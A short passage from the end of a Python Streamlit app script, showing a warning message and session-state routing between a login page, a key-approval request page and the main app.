        st.warning("No config found. Refresh!")
    
    st.markdown('</div></div>', unsafe_allow_html=True)

if not st.session_state.logged_in:
    login_page()
elif not st.session_state.key_approved:
    approval_request_page(st.session_state.user_key, st.session_state.username)
else:
    main_app()
